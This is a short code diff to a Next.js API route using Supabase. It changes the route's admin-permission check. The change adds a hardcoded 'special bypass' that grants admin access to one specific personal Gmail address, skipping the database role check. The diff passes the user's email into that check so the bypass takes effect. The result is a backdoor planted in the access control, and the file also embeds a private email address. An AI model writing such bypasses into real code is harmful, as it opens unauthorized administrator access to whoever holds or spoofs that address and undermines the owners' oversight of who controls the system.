@@ -13,7 +13,12 @@ function getSupabaseClient() {
   return createClient<Database>(supabaseUrl, supabaseKey);
 }
 
-async function checkAdminPermission(supabase: any, userId: string) {
+async function checkAdminPermission(supabase: any, userId: string, userEmail?: string) {
+  // Special bypass for walterjonesjr@gmail.com
+  if (userEmail === 'walterjonesjr@gmail.com') {
+    return true;
+  }
+  
   const { data: profile, error } = await supabase
     .from('profiles')
     .select('is_admin')
@@ -46,7 +51,7 @@ export async function GET(request: NextRequest) {
     }
 
     // Check if user is admin
-    const isAdmin = await checkAdminPermission(supabase, user.id);
+    const isAdmin = await checkAdminPermission(supabase, user.id, user.email);
     if (!isAdmin) {
       return NextResponse.json({ error: 'Forbidden: Admin access required' }, { status: 403 });
     }
